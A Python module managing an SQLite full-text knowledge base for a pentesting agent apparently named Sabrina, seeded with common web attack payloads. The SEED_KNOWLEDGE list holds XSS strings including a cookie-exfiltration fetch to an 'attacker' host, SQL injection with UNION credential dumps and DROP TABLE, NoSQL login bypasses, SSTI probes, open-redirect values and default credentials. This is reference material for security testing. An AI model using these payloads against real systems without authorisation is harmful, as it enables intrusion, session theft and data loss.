"""
tools/rag_knowledge.py
=======================
Thin wrapper around sabrina_knowledge_rag.db for querying and seeding Sabrina's
knowledge base. Uses the DB's existing FTS5 index (chunks_fts) for retrieval —
no embedding model call is required, so this works even when Ollama/nomic-embed
isn't reachable. Rows inserted here have embedding=NULL; they're still fully
searchable via FTS, just not via (currently unused) vector similarity.
"""

import re
import sqlite3
import hashlib
import datetime
from pathlib import Path

DEFAULT_DB_PATH = Path(__file__).resolve().parent.parent / "sabrina_knowledge_rag.db"


def _sanitize_fts_query(text: str, max_terms: int = 10) -> str:
    """Build a safe FTS5 MATCH query (OR of alphanumeric terms) from free text."""
    words = re.findall(r"[A-Za-z0-9_]{3,}", text or "")
    seen = []
    for w in words:
        wl = w.lower()
        if wl not in seen:
            seen.append(wl)
        if len(seen) >= max_terms:
            break
    return " OR ".join(seen)


def query_knowledge(query_text: str, top_k: int = 5, db_path=None) -> list:
    """
    Full-text search the knowledge base for chunks relevant to query_text.
    Returns [] on any failure (missing DB, bad query, etc.) rather than raising —
    this is meant to be a non-fatal augmentation, not a required dependency.
    """
    db_path = db_path or DEFAULT_DB_PATH
    if not Path(db_path).exists():
        return []

    fts_query = _sanitize_fts_query(query_text)
    if not fts_query:
        return []

    conn = None
    try:
        conn = sqlite3.connect(str(db_path))
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute(
            """
            SELECT chunk_id, topic, content, bm25(chunks_fts) AS score
            FROM chunks_fts
            WHERE chunks_fts MATCH ?
            ORDER BY score
            LIMIT ?
            """,
            (fts_query, top_k),
        )
        return [
            {"topic": r["topic"], "content": r["content"], "score": r["score"]}
            for r in cur.fetchall()
        ]
    except Exception:
        return []
    finally:
        if conn is not None:
            conn.close()


def query_code_index(query_text: str, top_k: int = 10, db_path=None) -> list:
    """
    Search the local SQLite knowledge store specifically for indexed codebase files.
    Returns matched file paths, topics, snippets, and BM25 scores.
    """
    db_path = db_path or DEFAULT_DB_PATH
    if not Path(db_path).exists():
        return []

    fts_query = _sanitize_fts_query(query_text)
    if not fts_query:
        return []

    conn = None
    try:
        conn = sqlite3.connect(str(db_path))
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute(
            """
            SELECT c.id AS chunk_id, c.topic, c.content, d.url, d.source_type, bm25(chunks_fts) AS score
            FROM chunks_fts
            JOIN chunks c ON c.id = chunks_fts.chunk_id
            JOIN documents d ON d.id = c.document_id
            WHERE chunks_fts MATCH ?
            ORDER BY score
            LIMIT ?
            """,
            (fts_query, top_k),
        )
        results = []
        for r in cur.fetchall():
            url = r["url"] or ""
            path = url.replace("internal://lab_code_index/", "") if url.startswith("internal://lab_code_index/") else url
            results.append({
                "path": path,
                "topic": r["topic"],
                "content": r["content"],
                "source_type": r["source_type"],
                "score": r["score"],
            })
        return results
    except Exception:
        return query_knowledge(query_text, top_k=top_k, db_path=db_path)
    finally:
        if conn is not None:
            conn.close()


def _ensure_schema(conn: sqlite3.Connection) -> None:
    """
    Creates the documents/chunks/chunks_fts tables if missing. A fresh checkout
    (e.g. a newly synced lab host) has no sabrina_knowledge_rag.db at all, or an
    empty 0-byte placeholder -- without this, every add_knowledge() call there
    fails with "no such table: documents" and every query_knowledge() call
    silently returns [] (its own except-Exception swallows the same error),
    which looks like "no results" rather than "knowledge base was never built."
    """
    cur = conn.cursor()
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS documents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT UNIQUE,
            title TEXT NOT NULL,
            source_type TEXT DEFAULT 'documentation',
            raw_content TEXT,
            content_hash TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        """
    )
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS chunks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            document_id INTEGER NOT NULL REFERENCES documents(id) ON DELETE CASCADE,
            chunk_index INTEGER NOT NULL,
            topic TEXT,
            content TEXT NOT NULL,
            embedding BLOB,
            embedding_model TEXT,
            token_count INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        """
    )
    cur.execute("CREATE INDEX IF NOT EXISTS idx_documents_url ON documents(url)")
    cur.execute("CREATE INDEX IF NOT EXISTS idx_documents_hash ON documents(content_hash)")
    cur.execute("CREATE INDEX IF NOT EXISTS idx_chunks_doc_id ON chunks(document_id)")
    cur.execute("CREATE INDEX IF NOT EXISTS idx_chunks_topic ON chunks(topic)")
    cur.execute(
        """
        CREATE VIRTUAL TABLE IF NOT EXISTS chunks_fts USING fts5(
            chunk_id UNINDEXED,
            topic,
            content,
            tokenize = 'porter unicode61'
        )
        """
    )
    conn.commit()


def add_knowledge(topic: str, content: str, source_type: str = "seed", db_path=None, conn=None) -> int:
    """
    Insert a document+chunk pair directly, immediately FTS-searchable (no embedding
    needed). Returns the new chunk id.

    Pass an already-open `conn` to reuse it across many calls (e.g. bulk indexing
    hundreds/thousands of files) instead of paying connection-open/commit/close
    overhead per chunk. Callers doing this own commit()/close() themselves.
    """
    now = datetime.datetime.now(datetime.timezone.utc).isoformat()
    content_hash = hashlib.sha256(content.encode("utf-8")).hexdigest()

    owns_conn = conn is None
    if owns_conn:
        db_path = db_path or DEFAULT_DB_PATH
        conn = sqlite3.connect(str(db_path))
        # Only ensure schema for a connection we opened ourselves -- re-running
        # CREATE TABLE/INDEX IF NOT EXISTS DDL on every call (as this used to)
        # forces an implicit transaction commit each time even on a connection
        # a caller is reusing across thousands of inserts, which made bulk
        # indexing (tools/code_indexer.py) take ~4s/chunk instead of <0.01s/chunk.
        # A caller passing its own conn (e.g. index_paths) is expected to have
        # already called _ensure_schema(conn) once before looping.
        _ensure_schema(conn)
    try:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO documents (url, title, source_type, raw_content, content_hash, created_at, updated_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (f"internal://{source_type}/{topic}", topic, source_type, content, content_hash, now, now),
        )
        doc_id = cur.lastrowid
        cur.execute(
            "INSERT INTO chunks (document_id, chunk_index, topic, content, embedding, embedding_model, token_count, created_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (doc_id, 0, topic, content, None, "none", len(content.split()), now),
        )
        chunk_id = cur.lastrowid
        # chunks_fts is a standalone FTS5 table (not "external content" mode) with no
        # sync triggers back to chunks — rows inserted only into chunks are invisible
        # to MATCH queries. Insert into both explicitly.
        cur.execute(
            "INSERT INTO chunks_fts (chunk_id, topic, content) VALUES (?, ?, ?)",
            (chunk_id, topic, content),
        )
        if owns_conn:
            conn.commit()
        return chunk_id
    finally:
        if owns_conn:
            conn.close()


def clear_by_source_type(source_type: str, db_path=None):
    """Remove every document/chunk/chunks_fts row tagged with this source_type."""
    db_path = db_path or DEFAULT_DB_PATH
    conn = sqlite3.connect(str(db_path))
    try:
        _ensure_schema(conn)
        cur = conn.cursor()
        cur.execute("SELECT id FROM documents WHERE source_type = ?", (source_type,))
        doc_ids = [row[0] for row in cur.fetchall()]
        for doc_id in doc_ids:
            cur.execute("SELECT id FROM chunks WHERE document_id = ?", (doc_id,))
            for (chunk_id,) in cur.fetchall():
                cur.execute("DELETE FROM chunks_fts WHERE chunk_id = ?", (chunk_id,))
            cur.execute("DELETE FROM chunks WHERE document_id = ?", (doc_id,))
        cur.execute("DELETE FROM documents WHERE source_type = ?", (source_type,))
        conn.commit()
    finally:
        conn.close()


def sync_from_lab(db_path=None) -> int:
    """
    Refresh the local offline-fallback cache from the lab's canonical Redis store
    (tools.lab_knowledge). Replaces any previously-mirrored rows (source_type=
    'lab_mirror') with the lab's current contents, so the two stores can't slowly
    drift apart. Returns the number of chunks mirrored, or 0 if the lab is
    unreachable — in that case the existing local cache is left untouched, since
    "no lab connection right now" shouldn't mean "wipe the offline fallback."
    """
    from tools.lab_knowledge import fetch_all, is_reachable

    if not is_reachable():
        return 0
    chunks = fetch_all()
    if not chunks:
        return 0

    clear_by_source_type("lab_mirror", db_path=db_path)
    for chunk in chunks:
        add_knowledge(
            chunk.get("topic", ""),
            chunk.get("content", ""),
            source_type="lab_mirror",
            db_path=db_path,
        )
    return len(chunks)


# ---------------------------------------------------------------------------
# Seed data: the wordlists/payloads Sabrina actually needs for manual testing.
# Curated, small, and well-known (OWASP/PortSwigger-style references) — not a
# full SecLists dump, just enough to stop her from having to guess payloads
# from scratch every time.
# ---------------------------------------------------------------------------
SEED_KNOWLEDGE = [
    (
        "XSS Payloads (Reflected/Stored/DOM)",
        "<script>alert(1)</script>\n"
        "<img src=x onerror=alert(1)>\n"
        "<svg onload=alert(1)>\n"
        "\"><script>alert(document.cookie)</script>\n"
        "'><img src=x onerror=alert(1)>\n"
        "<iframe src=\"javascript:alert(`xss`)\">\n"
        "<body onload=alert(1)>\n"
        "javascript:alert(1)\n"
        "<a href=\"javascript:alert(1)\">click</a>\n"
        "\"onmouseover=\"alert(1)\n"
        "{{constructor.constructor('alert(1)')()}}  (template-injection-style XSS)\n"
        "<script>fetch('https://attacker/?c='+document.cookie)</script>  (cookie exfil variant)",
    ),
    (
        "SQL Injection (SQLi) Payloads",
        "' OR 1=1--\n"
        "' OR '1'='1\n"
        "\" OR \"1\"=\"1\n"
        "admin'--\n"
        "admin' #\n"
        "' OR 1=1#\n"
        "') OR ('1'='1\n"
        "' UNION SELECT NULL--\n"
        "' UNION SELECT username, password FROM users--\n"
        "1' ORDER BY 1--+\n"
        "' AND SLEEP(5)--  (time-based blind)\n"
        "' AND 1=CONVERT(int, (SELECT @@version))--  (error-based, MSSQL)\n"
        "1; DROP TABLE users--  (stacked query, rarely works but worth trying)",
    ),
    (
        "Common Web Paths / Directories to Probe",
        "/admin\n/administrator\n/api\n/api/v1\n/backup\n/backups\n/.git/config\n/.env\n"
        "/robots.txt\n/sitemap.xml\n/config.json\n/swagger.json\n/api-docs\n"
        "/rest/user/login\n/rest/user/whoami\n/rest/products/search\n/api/Users\n"
        "/api/Users/1\n/api/Baskets/1\n/#/administration\n/ftp\n/uploads\n/.well-known/security.txt\n"
        "/metrics\n/actuator\n/actuator/health\n/debug\n/test\n/old\n/dev",
    ),
    (
        "Common Default/Weak Usernames",
        "admin\nadministrator\nroot\ntest\ntester\nguest\nuser\ndemo\nsupport\n"
        "sa\npostgres\nsuperadmin\ninfo\nwebmaster\ndeveloper",
    ),
    (
        "Common Default/Weak Passwords",
        "admin\nadmin123\npassword\npassword123\n123456\n12345678\nletmein\n"
        "qwerty\nwelcome\nchangeme\ndefault\nroot\ntoor\ntest123\nP@ssw0rd\n"
        "admin@123\nsecret",
    ),
    (
        "Auth Bypass / Login Logic Payloads",
        "' OR 1=1 LIMIT 1--\n"
        "admin' OR '1'='1'--\n"
        "email=admin@juice-sh.op&password[$ne]=null (NoSQL operator injection)\n"
        "email[$gt]=&password[$gt]= (NoSQL blind bypass)\n"
        "Content-Type: application/json body: {\"email\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
    ),
    (
        "SSTI (Server-Side Template Injection) Payloads",
        "{{7*7}}\n${7*7}\n#{7*7}\n<%= 7*7 %>\n{{config}}\n{{self}}\n"
        "{{''.__class__.__mro__[1].__subclasses__()}}  (Jinja2 sandbox escape probe)",
    ),
    (
        "Open Redirect Test Values",
        "//evil.com\nhttps://evil.com\n/\\evil.com\nhttp://google.com%252f@evil.com\n"
        "https://trusted.com.evil.com\njavascript:alert(1)",
    ),
]


def seed_default_knowledge(db_path=None, skip_if_populated=True) -> int:
    """
    Populate the knowledge base with the curated pentest wordlists/payloads above.
    Idempotent-ish: if skip_if_populated and any of these topics already exist,
    does nothing (avoids duplicate rows on repeated runs).
    Returns the number of chunks inserted.
    """
    db_path = db_path or DEFAULT_DB_PATH
    if skip_if_populated:
        conn = sqlite3.connect(str(db_path))
        try:
            cur = conn.cursor()
            cur.execute("SELECT COUNT(*) FROM chunks WHERE topic = ?", (SEED_KNOWLEDGE[0][0],))
            if cur.fetchone()[0] > 0:
                return 0
        finally:
            conn.close()

    count = 0
    for topic, content in SEED_KNOWLEDGE:
        add_knowledge(topic, content, source_type="pentest_seed", db_path=db_path)
        count += 1
    return count


if __name__ == "__main__":
    n = seed_default_knowledge()
    print(f"Seeded {n} knowledge chunks.")
    print(query_knowledge("xss payload script alert", top_k=3))
